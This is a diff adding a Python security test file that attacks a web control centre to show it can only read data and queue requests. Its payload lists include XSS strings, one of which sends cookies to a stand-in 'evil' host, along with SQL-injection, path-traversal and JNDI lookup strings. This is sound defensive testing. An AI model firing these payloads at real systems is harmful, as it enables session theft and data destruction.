@@ -1,0 +1,869 @@
+"""§57–§60, §92–§93: attack the control centre, and prove it is not a bypass.
+
+Every attack here goes straight at :class:`ControlCentre`, not through a browser.
+That is deliberate: hiding a button is not a control, and an attacker sends the
+request directly. If a defence only works because the UI does not offer the
+action, it does not work.
+
+The property this file exists to establish is narrow and stated plainly: a
+compromised control centre can **read business data** and **queue requests**, and
+can do nothing else. It cannot send, charge, promote, rewrite, clear HALT, edit
+the audit log, or read a secret.
+"""
+
+from __future__ import annotations
+
+import pathlib
+import sqlite3
+import tempfile
+import unittest
+
+from solvent import skillslab as lab
+from solvent.harness import OWNER, Solvent, run_csv_job
+from solvent.web import auth as web_auth
+from solvent.web import intents as web_intents
+from solvent.web import server as web_server
+from solvent.web.app import SECURITY_HEADERS, ControlCentre, Request
+from solvent.web.readmodel import ReadModel
+from tests_solvent import fixtures_csv as fx
+from tests_solvent.test_controlled_trial import AGREED, CLIENT_FILE, workspace
+from tests_solvent.test_csv_promotion import promoted
+from tests_solvent.test_owner_decisions import decided
+
+PASSWORD = "TEST-ONLY-control-centre-password"
+
+#: Payloads that carry HTML-special characters. Escaping must change these, so
+#: none may appear verbatim on a page.
+MARKUP_PAYLOADS = (
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "\"><svg onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "</textarea><script>fetch('//evil/'+document.cookie)</script>",
+    "'; DROP TABLE jobs; --",
+    "' OR '1'='1",
+)
+
+#: Payloads that are plain text. Escaping leaves these byte-identical, and that
+#: is right: they are the client's words, they are inert as text, and refusing to
+#: show them would hide what the client actually said. They are here because
+#: "nothing hostile appears verbatim" is the wrong property, and an earlier
+#: version of this file asserted it.
+TEXT_PAYLOADS = (
+    "../../etc/passwd",
+    "${jndi:ldap://evil/x}",
+    "javascript:alert(1)",
+)
+
+HOSTILE_STRINGS = MARKUP_PAYLOADS + TEXT_PAYLOADS
+
+
+def build_database(path: str) -> str:
+    solvent = promoted(decided(Solvent(path)))
+    solvent.policy.record_contracting_structure(
+        owner_identity=OWNER, structure=solvent.policy.INDIVIDUAL,
+        reason="test", legal_name="TEST-ONLY Owner",
+        email="test-only@example.invalid")
+    source, work = workspace(CLIENT_FILE)
+    report = run_csv_job(source=source, requirements=list(AGREED), workdir=work,
+                         solvent=solvent, client_id="client:one",
+                         title="Tidy the export")
+    solvent.ledger.open_payment(job_id=report.job_id, amount_cents=12000,
+                                rail="stripe")
+    for hostile in HOSTILE_STRINGS:
+        solvent.relations.handle(job_id=report.job_id, body=hostile, source=source)
+    other, other_work = workspace(fx.CLEAN)
+    second = run_csv_job(source=other, requirements=list(fx.SIMPLE),
+                         workdir=other_work, solvent=solvent,
+                         client_id="client:two", title="Second client work")
+    project = solvent.skillslab.record_need(
+        skill="pdf-extract", need="a client sent a PDF", observed_on=report.job_id)
+    solvent.skillslab.check_overlap(
+        project_id=project, target_covers=frozenset({"extract_pdf_text"}))
+    solvent.store.close()
+    return report.job_id, second.job_id, project
+
+
+class Base(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        cls.dir = pathlib.Path(tempfile.mkdtemp())
+        cls.db = str(cls.dir / "solvent.db")
+        cls.job_id, cls.other_job_id, cls.project_id = build_database(cls.db)
+        cls.hash = web_auth.hash_password(PASSWORD)
+
+    def setUp(self):
+        self.spool = pathlib.Path(tempfile.mkdtemp())
+        self.centre = web_server.build(self.db, password_hash=self.hash,
+                                       spool=str(self.spool))
+
+    def tearDown(self):
+        self.centre.read.close()
+
+    def sign_in(self, source: str = "10.0.0.1", centre=None) -> dict:
+        """A session on ``centre``. Sessions live in memory per process, so a
+        cookie from one ControlCentre means nothing to another — which caught two
+        tests of mine that were asserting against an empty redirect body."""
+        target = centre or self.centre
+        response = target.handle(Request(
+            "POST", "/login", form={"password": PASSWORD}, source=source))
+        self.assertEqual(response.status, 303)
+        return {"solvent_session": response.set_session}
+
+    def get(self, path: str, cookies=None, **query):
+        return self.centre.handle(Request("GET", path, query=query,
+                                          cookies=cookies or {}))
+
+    def csrf(self, cookies: dict) -> str:
+        return self.centre.sessions.get(cookies["solvent_session"])["csrf"]
+
+
+class NothingWorksWithoutASession(Base):
+    """§58. Authorisation is enforced in the handler, before routing."""
+
+    def test_every_page_redirects_an_anonymous_visitor(self):
+        for path in ("/", "/jobs", "/job", "/clients", "/client", "/sources",
+                     "/skills", "/skill", "/capabilities", "/service",
+                     "/approvals", "/money", "/model", "/security", "/audit",
+                     "/health", "/setup"):
+            with self.subTest(path=path):
+                response = self.get(path)
+                self.assertEqual(response.status, 303)
+                self.assertIn(("Location", "/login"), response.headers)
+
+    def test_a_signed_in_owner_can_reach_them(self):
+        """Guards the test above: a surface that refuses everybody is not
+        secure, it is broken."""
+        cookies = self.sign_in()
+        for path in ("/", "/jobs", "/clients", "/sources", "/skills",
+                     "/capabilities", "/service", "/approvals", "/money",
+                     "/model", "/security", "/audit", "/health", "/setup"):
+            with self.subTest(path=path):
+                self.assertEqual(self.get(path, cookies).status, 200)
+
+    def test_a_forged_session_cookie_is_not_a_session(self):
+        for forged in ("", "x", "a" * 43, "../../admin", "null"):
+            with self.subTest(forged=forged):
+                response = self.get("/", {"solvent_session": forged})
+                self.assertEqual(response.status, 303)
+
+    def test_an_expired_session_stops_working(self):
+        clock = [1000.0]
+        sessions = web_auth.Sessions(now=lambda: clock[0])
+        centre = ControlCentre(ReadModel(self.db), sessions=sessions,
+                               password_hash=self.hash,
+                               intent_writer=web_intents.IntentWriter(
+                                   str(self.spool)))
+        session_id, _ = sessions.create()
+        cookies = {"solvent_session": session_id}
+        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
+                         200)
+        clock[0] += web_auth.IDLE_TIMEOUT + 1
+        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
+                         303)
+        centre.read.close()
+
+    def test_a_session_expires_absolutely_even_when_used(self):
+        clock = [1000.0]
+        sessions = web_auth.Sessions(now=lambda: clock[0])
+        centre = ControlCentre(ReadModel(self.db), sessions=sessions,
+                               password_hash=self.hash,
+                               intent_writer=web_intents.IntentWriter(
+                                   str(self.spool)))
+        session_id, _ = sessions.create()
+        cookies = {"solvent_session": session_id}
+        for _ in range(30):
+            clock[0] += web_auth.IDLE_TIMEOUT - 10
+            centre.handle(Request("GET", "/", cookies=cookies))
+        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
+                         303)
+        centre.read.close()
+
+    def test_signing_out_ends_the_session_immediately(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/logout", form={"csrf": self.csrf(cookies)},
+            cookies=cookies))
+        self.assertEqual(response.status, 303)
+        self.assertTrue(response.clear_session)
+        self.assertEqual(self.get("/", cookies).status, 303)
+
+    def test_a_logout_by_get_does_nothing(self):
+        """A logout on an <img> tag is CSRF too — the annoying kind."""
+        cookies = self.sign_in()
+        self.centre.handle(Request("GET", "/logout", cookies=cookies))
+        self.assertEqual(self.get("/", cookies).status, 200)
+
+
+class ThePasswordPathResists(Base):
+    def test_a_wrong_password_is_refused(self):
+        response = self.centre.handle(Request(
+            "POST", "/login", form={"password": "wrong"}, source="10.0.0.9"))
+        self.assertEqual(response.status, 401)
+        self.assertFalse(response.set_session)
+
+    def test_repeated_failures_lock_the_source_out(self):
+        for _ in range(web_auth.MAX_FAILURES):
+            self.centre.handle(Request("POST", "/login",
+                                       form={"password": "wrong"},
+                                       source="10.0.0.13"))
+        response = self.centre.handle(Request(
+            "POST", "/login", form={"password": PASSWORD}, source="10.0.0.13"))
+        self.assertEqual(response.status, 429)
+        self.assertFalse(response.set_session)
+
+    def test_the_lockout_is_per_source_not_global(self):
+        """Otherwise anybody could lock the owner out of their own business."""
+        for _ in range(web_auth.MAX_FAILURES):
+            self.centre.handle(Request("POST", "/login",
+                                       form={"password": "wrong"},
+                                       source="10.0.0.66"))
+        response = self.centre.handle(Request(
+            "POST", "/login", form={"password": PASSWORD}, source="10.0.0.67"))
+        self.assertEqual(response.status, 303)
+
+    def test_the_failure_message_does_not_say_which_part_was_wrong(self):
+        response = self.centre.handle(Request(
+            "POST", "/login", form={"password": "wrong"}, source="10.0.0.21"))
+        body = response.body.decode().lower()
+        for oracle in ("no such user", "unknown user", "password incorrect",
+                       "locked"):
+            with self.subTest(oracle=oracle):
+                self.assertNotIn(oracle, body)
+
+    def test_no_password_configured_refuses_rather_than_admitting_everyone(self):
+        centre = ControlCentre(ReadModel(self.db), password_hash="",
+                               intent_writer=web_intents.IntentWriter(
+                                   str(self.spool)))
+        response = centre.handle(Request("POST", "/login",
+                                         form={"password": ""}, source="1.1.1.1"))
+        self.assertEqual(response.status, 503)
+        self.assertFalse(response.set_session)
+        centre.read.close()
+
+    def test_a_short_password_cannot_be_hashed_at_all(self):
+        with self.assertRaises(ValueError):
+            web_auth.hash_password("short")
+
+    def test_a_stored_hash_does_not_contain_the_password(self):
+        encoded = web_auth.hash_password(PASSWORD)
+        self.assertNotIn(PASSWORD, encoded)
+        self.assertTrue(encoded.startswith("pbkdf2$"))
+        self.assertTrue(web_auth.check_password(PASSWORD, encoded))
+        self.assertFalse(web_auth.check_password(PASSWORD + "x", encoded))
+
+    def test_a_malformed_hash_never_authenticates(self):
+        for broken in ("", "x", "pbkdf2$abc$de$ff", "pbkdf2$1$zz$zz",
+                       "plain$1$a$b", None):
+            with self.subTest(broken=broken):
+                self.assertFalse(web_auth.check_password(PASSWORD, broken))
+
+
+class CsrfHolds(Base):
+    """§58. A form the owner did not submit must not act."""
+
+    def test_a_post_without_a_token_is_refused(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent", form={"verb": "halt", "why": "x"},
+            cookies=cookies))
+        self.assertEqual(response.status, 403)
+        self.assertEqual(self.centre.intents.pending(), [])
+
+    def test_a_post_with_another_sessions_token_is_refused(self):
+        first = self.sign_in("10.0.0.2")
+        second = self.sign_in("10.0.0.3")
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "halt", "why": "x", "csrf": self.csrf(second)},
+            cookies=first))
+        self.assertEqual(response.status, 403)
+        self.assertEqual(self.centre.intents.pending(), [])
+
+    def test_a_valid_token_is_accepted(self):
+        """Guards the two tests above."""
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "acknowledge_alert", "why": "seen",
+                  "csrf": self.csrf(cookies)}, cookies=cookies))
+        self.assertEqual(response.status, 200)
+        self.assertEqual(len(self.centre.intents.pending()), 1)
+
+    def test_tokens_differ_between_sessions(self):
+        self.assertNotEqual(self.csrf(self.sign_in("10.0.0.4")),
+                            self.csrf(self.sign_in("10.0.0.5")))
+
+
+class ClientDataDoesNotCross(Base):
+    """§11 and §66. One client's page shows one client's work."""
+
+    def test_a_client_page_shows_only_that_client(self):
+        cookies = self.sign_in()
+        body = self.get("/client", cookies, id="client:one").body.decode()
+        self.assertIn("client:one", body)
+        self.assertNotIn("client:two", body)
+        self.assertNotIn("Second client work", body)
+
+    def test_the_other_client_page_is_the_mirror_image(self):
+        cookies = self.sign_in()
+        body = self.get("/client", cookies, id="client:two").body.decode()
+        self.assertIn("Second client work", body)
+        self.assertNotIn("Tidy the export", body)
+
+    def test_a_job_id_from_another_client_is_not_relabelled(self):
+        """IDOR: asking for a job by id is allowed — the owner owns them all —
+        but it must show that job's real client, not the one in the URL."""
+        cookies = self.sign_in()
+        body = self.get("/job", cookies, id=self.other_job_id).body.decode()
+        self.assertIn("client:two", body)
+
+    def test_an_unknown_client_is_refused_rather_than_shown_empty(self):
+        cookies = self.sign_in()
+        body = self.get("/client", cookies, id="client:does-not-exist").body.decode()
+        self.assertIn("No such client", body)
+
+    def test_an_unknown_job_is_refused(self):
+        cookies = self.sign_in()
+        self.assertIn("No such job",
+                      self.get("/job", cookies, id="job_nope").body.decode())
+
+
+class HostileContentIsDisplayedNotExecuted(Base):
+    """§59. Every one of these is in the database, put there by a client."""
+
+    def test_no_hostile_string_appears_verbatim_on_any_page(self):
+        """The precise property. Substring checks like "onerror=" absent are
+        wrong: `&lt;img src=x onerror=alert(1)&gt;` contains that text and is
+        inert, because the angle brackets are escaped. What matters is that the
+        client's bytes never reach the page unescaped."""
+        cookies = self.sign_in()
+        for path in ("/", "/jobs", "/service", "/clients", "/skills", "/audit"):
+            body = self.get(path, cookies).body.decode()
+            for hostile in MARKUP_PAYLOADS:
+                with self.subTest(path=path, hostile=hostile[:30]):
+                    self.assertNotIn(hostile, body)
+
+    def test_no_page_opens_a_tag_that_data_put_there(self):
+        """No `<` from client data survives. Checked outside the stylesheet,
+        which legitimately contains `<`-free CSS that tripped a cruder version
+        of this test on `:root:not(...)`."""
+        import re
+
+        cookies = self.sign_in()
+        for path in ("/", "/jobs", "/service", "/clients", "/skills", "/audit"):
+            body = re.sub(r"<style>.*?</style>", "",
+                          self.get(path, cookies).body.decode(), flags=re.S)
+            with self.subTest(path=path):
+                for opener in ("<script", "<iframe", "<svg", "<img",
+                               "<textarea", "<object", "<embed"):
+                    self.assertNotIn(opener, body.lower())
+
+    def test_a_plain_text_payload_is_shown_as_the_clients_own_words(self):
+        """`../../etc/passwd` in a message is text. Escaping does not change it,
+        it cannot do anything as text, and hiding it would hide the client."""
+        cookies = self.sign_in()
+        body = self.get("/service", cookies).body.decode()
+        for payload in TEXT_PAYLOADS:
+            with self.subTest(payload=payload):
+                self.assertIn(payload, body)
+
+    def test_no_attribute_value_is_built_from_client_data(self):
+        """`javascript:alert(1)` is safe as table text and unsafe as an href. No
+        route puts client data into an attribute, so this pins that."""
+        import re
+
+        cookies = self.sign_in()
+        for path in ("/", "/jobs", "/service", "/clients"):
+            body = self.get(path, cookies).body.decode()
+            with self.subTest(path=path):
+                for value in re.findall(r'(?:href|src)="([^"]*)"', body):
+                    self.assertFalse(value.lower().startswith("javascript:"),
+                                     f"{path}: {value[:60]}")
+                    self.assertFalse(value.lower().startswith("data:"))
+
+    def test_the_hostile_strings_are_present_but_escaped(self):
+        """Guards the tests above: refusing to display the message would hide a
+        client's actual words from the owner, which is its own failure."""
+        cookies = self.sign_in()
+        body = self.get("/service", cookies).body.decode()
+        self.assertIn("&lt;script&gt;", body)
+        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", body)
+
+    def test_a_sql_payload_in_a_query_parameter_changes_nothing(self):
+        cookies = self.sign_in()
+        for payload in ("' OR '1'='1", "'; DROP TABLE jobs; --", "1; DELETE FROM jobs"):
+            with self.subTest(payload=payload):
+                self.get("/job", cookies, id=payload)
+                self.get("/jobs", cookies, state=payload)
+                self.get("/client", cookies, id=payload)
+        # The tables are still there and still populated.
+        self.assertTrue(self.centre.read.jobs())
+
+    def test_a_path_traversal_in_a_parameter_reaches_nothing(self):
+        """The canary is real passwd content, not the word "root" — the
+        stylesheet contains `:root:not(...)`, which a cruder canary matched."""
+        cookies = self.sign_in()
+        for payload in ("../../etc/passwd", "/etc/passwd",
+                        "....//....//etc/shadow", "..%2f..%2fetc%2fpasswd"):
+            with self.subTest(payload=payload):
+                body = self.get("/job", cookies, id=payload).body.decode()
+                self.assertNotIn("root:x:0:0", body)
+                self.assertNotIn("/bin/bash", body)
+                self.assertIn("No such job", body)
+
+    def test_no_route_opens_a_file_named_by_the_request(self):
+        """There is no file-serving route at all, which is why traversal has
+        nothing to reach. Asserted against the source so adding one is a
+        deliberate act that fails this test first."""
+        import pathlib as _pathlib
+
+        root = _pathlib.Path(web_auth.__file__).parent
+        for module in sorted(root.glob("*.py")):
+            text = module.read_text()
+            with self.subTest(module=module.name):
+                self.assertNotIn("send_file", text)
+                self.assertNotIn("open(request", text)
+                self.assertNotIn("read_bytes()", text.replace(
+                    "path.read_text(encoding=\"utf-8\")", ""))
+
+    def test_an_unknown_path_is_a_page_not_a_stack_trace(self):
+        cookies = self.sign_in()
+        response = self.get("/../../etc/passwd", cookies)
+        self.assertIn(response.status, (200, 303, 404))
+        self.assertNotIn("Traceback", response.body.decode())
+
+    def test_every_response_carries_the_security_headers(self):
+        cookies = self.sign_in()
+        headers = dict(self.get("/", cookies).headers)
+        self.assertEqual(headers["X-Frame-Options"], "DENY")
+        self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
+        self.assertIn("default-src 'none'", headers["Content-Security-Policy"])
+        self.assertIn("no-store", headers["Cache-Control"])
+
+    def test_the_content_policy_forbids_script_entirely(self):
+        """Which is what makes stored XSS unexploitable rather than unlikely."""
+        cookies = self.sign_in()
+        policy = dict(self.get("/", cookies).headers)["Content-Security-Policy"]
+        self.assertNotIn("script-src", policy.replace("default-src 'none'", ""))
+        self.assertIn("frame-ancestors 'none'", policy)
+
+
+class TheSurfaceCannotBecomeABypass(Base):
+    """§57. The property the whole design exists for."""
+
+    def test_the_database_connection_is_read_only(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute(
+                "UPDATE jobs SET state = 'COMPLETE'")
+
+    def test_it_cannot_insert_a_capability_promotion(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute(
+                "INSERT INTO registered_capabilities(id,ts,name,covers,proven,"
+                "version,owner_identity,why) VALUES('x','t','anything','*',1,"
+                "'v','web','because')")
+
+    def test_it_cannot_write_the_audit_log(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute(
+                "INSERT INTO audit_log(seq,ts,event,authority,initiator) "
+                "VALUES(9999,'t','forged','owner','web')")
+
+    def test_it_cannot_delete_audit_history(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute("DELETE FROM audit_log")
+
+    def test_it_cannot_amend_policy(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute(
+                "UPDATE policy_current SET value = '{}' WHERE key = 'document'")
+
+    def test_it_cannot_move_money(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            self.centre.read._conn.execute(
+                "UPDATE payments SET state='PAID', collected_cents=999999")
+
+    def test_the_package_holds_no_action_gate_and_no_owner_key(self):
+        """Not "does not use" — has no code path to. Checked against the parsed
+        source rather than the text, because a docstring that explains the owner
+        key is exactly what this package should contain, and a line that reads
+        one is what it must not."""
+        import ast
+        import pathlib as _pathlib
+
+        forbidden_names = {"ActionGate", "OwnerChannel", "PolicyStore", "Ledger",
+                           "SOLVENT_OWNER_KEY", "Solvent"}
+        root = _pathlib.Path(web_auth.__file__).parent
+        for module in sorted(root.glob("*.py")):
+            tree = ast.parse(module.read_text())
+            names, strings = set(), set()
+            for node in ast.walk(tree):
+                if isinstance(node, ast.Name):
+                    names.add(node.id)
+                elif isinstance(node, ast.Attribute):
+                    names.add(node.attr)
+                elif isinstance(node, ast.alias):
+                    names.add(node.name.split(".")[-1])
+                    names.add((node.asname or "").split(".")[-1])
+                elif isinstance(node, ast.Constant) and isinstance(node.value, str):
+                    strings.add(node.value)
+            with self.subTest(module=module.name):
+                self.assertEqual(names & forbidden_names, set())
+                # And the key's name never appears as a value being looked up.
+                for text in strings:
+                    self.assertNotEqual(text, "SOLVENT_OWNER_KEY")
+
+    def test_the_package_never_imports_the_composition_root(self):
+        import ast
+        import pathlib as _pathlib
+
+        root = _pathlib.Path(web_auth.__file__).parent
+        for module in sorted(root.glob("*.py")):
+            tree = ast.parse(module.read_text())
+            imported = set()
+            for node in ast.walk(tree):
+                if isinstance(node, ast.ImportFrom) and node.module:
+                    imported.add(node.module)
+                elif isinstance(node, ast.Import):
+                    imported.update(a.name for a in node.names)
+            with self.subTest(module=module.name):
+                for forbidden in ("harness", "solvent.harness", "gate",
+                                  "solvent.gate", "owner", "solvent.owner",
+                                  "policy", "solvent.policy"):
+                    self.assertNotIn(forbidden, imported)
+
+    def test_the_surface_never_constructs_a_solvent(self):
+        """Constructing one would install the egress hook and deny bind, so this
+        is load-bearing as well as a security property."""
+        import pathlib as _pathlib
+
+        root = _pathlib.Path(web_auth.__file__).parent
+        for module in sorted(root.glob("*.py")):
+            with self.subTest(module=module.name):
+                self.assertNotIn("Solvent(", module.read_text())
+
+    def test_a_consequential_intent_is_marked_as_needing_an_approval(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "promote_capability", "subject": "anything",
+                  "why": "attacker asks nicely", "csrf": self.csrf(cookies)},
+            cookies=cookies))
+        self.assertEqual(response.status, 200)
+        queued = self.centre.intents.pending()
+        self.assertEqual(len(queued), 1)
+        self.assertTrue(queued[0]["requires_owner_approval"])
+        self.assertEqual(queued[0]["intent_class"], web_intents.CONSEQUENTIAL)
+
+    def test_queueing_an_intent_promotes_nothing(self):
+        cookies = self.sign_in()
+        self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "promote_capability", "subject": "pdf-extract",
+                  "why": "x", "csrf": self.csrf(cookies)}, cookies=cookies))
+        names = {c["name"] for c in self.centre.read.capabilities()
+                 if c.get("proven")}
+        self.assertNotIn("pdf-extract", names)
+
+    def test_an_intent_verb_that_is_not_on_the_list_is_refused(self):
+        cookies = self.sign_in()
+        for verb in ("", "rm", "exec", "clear_audit", "disable_firewall",
+                     "dump_secrets", "promote_everything"):
+            with self.subTest(verb=verb):
+                response = self.centre.handle(Request(
+                    "POST", "/intent",
+                    form={"verb": verb, "why": "x", "csrf": self.csrf(cookies)},
+                    cookies=cookies))
+                self.assertEqual(response.status, 400)
+        self.assertEqual(self.centre.intents.pending(), [])
+
+    def test_a_post_to_any_other_path_does_nothing(self):
+        cookies = self.sign_in()
+        for path in ("/", "/jobs", "/admin", "/api/promote", "/policy"):
+            with self.subTest(path=path):
+                response = self.centre.handle(Request(
+                    "POST", path, form={"csrf": self.csrf(cookies),
+                                        "verb": "halt", "why": "x"},
+                    cookies=cookies))
+                self.assertEqual(response.status, 404)
+        self.assertEqual(self.centre.intents.pending(), [])
+
+
+class HaltAndResumeAreNotSymmetrical(Base):
+    """§53. Stopping is safe; starting is not. They must not cost the same."""
+
+    def test_halting_needs_the_password_again(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "halt", "why": "something looks wrong",
+                  "csrf": self.csrf(cookies)}, cookies=cookies))
+        self.assertEqual(response.status, 403)
+        self.assertIn("password again", response.body.decode())
+
+    def test_halting_with_the_password_is_queued_as_safe(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "halt", "why": "something looks wrong",
+                  "password": PASSWORD, "csrf": self.csrf(cookies)},
+            cookies=cookies))
+        self.assertEqual(response.status, 200)
+        queued = self.centre.intents.pending()
+        self.assertEqual(queued[0]["intent_class"], web_intents.SAFE)
+        self.assertFalse(queued[0]["requires_owner_approval"])
+
+    def test_resuming_is_consequential_and_needs_an_owner_approval(self):
+        cookies = self.sign_in()
+        response = self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "resume", "why": "looks fine now",
+                  "password": PASSWORD, "csrf": self.csrf(cookies)},
+            cookies=cookies))
+        self.assertEqual(response.status, 200)
+        self.assertTrue(self.centre.intents.pending()[0]
+                        ["requires_owner_approval"])
+
+    def test_enabling_real_execution_is_consequential(self):
+        self.assertEqual(web_intents.classify("enable_real_execution"),
+                         web_intents.CONSEQUENTIAL)
+
+    def test_the_intent_did_not_change_the_posture_by_itself(self):
+        cookies = self.sign_in()
+        self.centre.handle(Request(
+            "POST", "/intent",
+            form={"verb": "halt", "why": "w", "password": PASSWORD,
+                  "csrf": self.csrf(cookies)}, cookies=cookies))
+        self.assertFalse(self.centre.read.posture()["halted"])
+        self.assertTrue(self.centre.read.posture()["simulation_only"])
+
+
+class NoSecretReachesAPage(Base):
+    """§91. Nothing here should have a secret to leak, which is the point."""
+
+    def test_no_page_contains_a_credential_shaped_value(self):
+        import re
+
+        cookies = self.sign_in()
+        pattern = re.compile(r"(sk_live_|sk_test_[A-Za-z0-9]{8}|whsec_[A-Za-z0-9]{8}"
+                             r"|pbkdf2\$)")
+        for path in ("/", "/jobs", "/security", "/setup", "/model", "/money",
+                     "/audit", "/health", "/approvals"):
+            with self.subTest(path=path):
+                self.assertIsNone(pattern.search(self.get(path, cookies)
+                                                 .body.decode()))
+
+    def test_the_password_hash_is_never_rendered(self):
+        cookies = self.sign_in()
+        for path in ("/setup", "/security", "/"):
+            with self.subTest(path=path):
+                self.assertNotIn(self.hash,
+                                 self.get(path, cookies).body.decode())
+
+    def test_the_setup_page_reports_presence_not_values(self):
+        cookies = self.sign_in()
+        body = self.get("/setup", cookies).body.decode()
+        self.assertIn("Owner setup", body)
+        self.assertNotIn("TEST-ONLY Owner", body)
+
+    def test_a_session_id_is_not_echoed_into_a_page(self):
+        cookies = self.sign_in()
+        body = self.get("/", cookies).body.decode()
+        self.assertNotIn(cookies["solvent_session"], body)
+
+    def test_the_csrf_token_is_not_the_session_id(self):
+        cookies = self.sign_in()
+        self.assertNotEqual(self.csrf(cookies), cookies["solvent_session"])
+
+    def test_the_login_page_leaks_nothing_before_authentication(self):
+        body = self.centre.handle(Request("GET", "/login")).body.decode()
+        for leak in ("client:one", "Tidy the export", "solvent.db", self.hash):
+            with self.subTest(leak=str(leak)[:20]):
+                self.assertNotIn(str(leak), body)
+
+
+class SimulatedMoneyIsNeverRealMoney(Base):
+    """§40. The most consequential lie this surface could tell."""
+
+    def test_collected_excludes_simulated_payments(self):
+        cash = self.centre.read.money()
+        self.assertEqual(cash["collected_cents"], 0)
+
+    def test_a_simulated_payment_is_reported_separately(self):
+        solvent = Solvent(self.db)
+        from solvent.ledger import SIMULATED_PREFIX
+        from solvent.types import PaymentState
+
+        payment = solvent.ledger.open_payment(job_id="job_sim",
+                                              amount_cents=50000,
+                                              rail="fixture_rail")
+        solvent.ledger.set_payment_state(
+            payment, PaymentState.PAID, collected_cents=50000,
+            verification_method=f"{SIMULATED_PREFIX}fixture")
+        solvent.store.close()
+        centre = web_server.build(self.db, password_hash=self.hash,
+                                  spool=str(self.spool))
+        try:
+            cash = centre.read.money()
+            self.assertEqual(cash["simulated_cents"], 50000)
+            self.assertEqual(cash["collected_cents"], 0)
+            cookies = self.sign_in(centre=centre)
+            body = centre.handle(Request("GET", "/money",
+                                         cookies=cookies)).body.decode()
+            self.assertIn("SIMULATED", body)
+        finally:
+            centre.read.close()
+
+
+class TheSurfaceDegradesHonestly(Base):
+    """§64. A control centre that lies when the backend is missing is worse than
+    one that will not start."""
+
+    def test_a_missing_database_refuses_rather_than_inventing_one(self):
+        with self.assertRaises(sqlite3.OperationalError):
+            ReadModel(str(self.dir / "does-not-exist.db"))
+
+    def test_an_empty_database_shows_empty_states_not_invented_figures(self):
+        empty = str(self.dir / "empty.db")
+        Solvent(empty).store.close()
+        centre = web_server.build(empty, password_hash=self.hash,
+                                  spool=str(self.spool))
+        try:
+            cookies = self.sign_in(centre=centre)
+            body = centre.handle(Request("GET", "/", cookies=cookies)).body.decode()
+            self.assertIn("No jobs yet", body)
+            self.assertIn("$0.00", body)
+            self.assertNotIn("NO DATA YET FAKE", body)
+        finally:
+            centre.read.close()
+
+    def test_a_missing_table_is_an_empty_section_not_an_error(self):
+        rows = self.centre.read.rows("SELECT * FROM a_table_that_never_existed")
+        self.assertEqual(rows, [])
+
+
+class TheRuntimeSideOfTheBoundary(unittest.TestCase):
+    """The half that can change something. The web process wrote a file; nothing
+    about that file is trusted here."""
+
+    def setUp(self):
+        self.dir = pathlib.Path(tempfile.mkdtemp())
+        self.db = str(self.dir / "solvent.db")
+        self.solvent = promoted(decided(Solvent(self.db)))
+        self.spool = pathlib.Path(tempfile.mkdtemp())
+        self.writer = web_intents.IntentWriter(str(self.spool))
+
+    def tearDown(self):
+        self.solvent.store.close()
+
+    def consume(self, **kwargs):
+        from solvent.harness import consume_owner_intents
+
+        return consume_owner_intents(self.solvent, spool=str(self.spool),
+                                     **kwargs)
+
+    def test_a_safe_intent_is_executed(self):
+        from solvent.types import OperatingMode
+
+        self.writer.write(verb="halt", requested_by="web:owner",
+                          why="something looks wrong")
+        results = self.consume()
+        self.assertEqual(results[0]["outcome"], "HALT engaged")
+        self.assertIs(self.solvent.policy.operating_mode, OperatingMode.HALT)
+
+    def test_every_consequential_intent_is_refused_without_an_approval(self):
+        for verb, (intent_class, _) in web_intents.INTENTS.items():
+            if intent_class != web_intents.CONSEQUENTIAL:
+                continue
+            with self.subTest(verb=verb):
+                writer = web_intents.IntentWriter(
+                    str(pathlib.Path(tempfile.mkdtemp())))
+                writer.write(verb=verb, requested_by="web:owner",
+                             why="an attacker asks nicely", subject="anything")
+                from solvent.harness import consume_owner_intents
+
+                results = consume_owner_intents(self.solvent,
+                                                spool=str(writer.spool))
+                self.assertEqual(results[0]["outcome"], "REFUSED")
+                self.assertIn("consequential", results[0]["why"])
+
+    def test_a_promotion_intent_promotes_nothing(self):
+        self.writer.write(verb="promote_capability", requested_by="web:owner",
+                          why="x", subject="pdf-extract")
+        self.consume()
+        proven = {c.name for c in self.solvent.capability.capabilities()
+                  if c.proven}
+        self.assertNotIn("pdf-extract", proven)
+
+    def test_a_resume_intent_does_not_clear_halt(self):
+        from solvent.types import OperatingMode
+
+        self.solvent.policy.set_operating_mode(OperatingMode.HALT, OWNER, "test")
+        self.writer.write(verb="resume", requested_by="web:owner", why="x")
+        self.consume()
+        self.assertIs(self.solvent.policy.operating_mode, OperatingMode.HALT)
+
+    def test_an_enable_real_execution_intent_does_not_enable_it(self):
+        self.writer.write(verb="enable_real_execution", requested_by="web:owner",
+                          why="x")
+        self.consume()
+        self.assertTrue(self.solvent.policy.get("egress", "simulation_only",
+                                               default=True))
+
+    def test_a_verb_that_is_not_on_the_list_is_refused(self):
+        (self.spool / "forged.intent").write_text(
